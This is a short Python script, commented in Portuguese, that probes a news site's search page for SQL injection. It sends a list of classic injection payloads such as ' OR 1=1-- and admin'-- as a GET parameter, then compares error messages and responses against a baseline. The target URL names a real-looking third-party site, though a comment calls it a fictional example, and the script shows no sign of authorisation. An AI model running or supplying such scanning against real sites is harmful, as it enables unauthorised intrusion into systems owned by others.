import requests

# CONFIGURAÇÕES
url_base = "https://chapadensenews.com.br/busca.php"  # exemplo fictício
parametro = "query"  # o nome do parâmetro GET ou POST vulnerável
teste_payloads = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' OR 'x'='x",
    "' OR 1=1#",
    "admin'--",
]
controle = "teste"  # entrada legítima, usada como baseline

def testar_payload(payload):
    try:
        params = {parametro: payload}
        resposta = requests.get(url_base, params=params, timeout=10)

        print(f"[+] Testando payload: {payload}")
        print(f"    Status: {resposta.status_code}")
        if any(erro in resposta.text.lower() for erro in ["sql", "syntax", "mysql", "query", "pdo", "fatal"]):
            print("    ⚠️ Possível mensagem de erro SQL detectada!")
        elif resposta.text != requests.get(url_base, params={parametro: controle}).text:
            print("    ✅ Resposta diferente do controle — possível injeção SQL.")
        else:
            print("    ❌ Nenhuma alteração perceptível.")
    except Exception as e:
        print(f"Erro ao testar payload: {e}")

# LOOP DE TESTES
for p in teste_payloads:
    testar_payload(p)
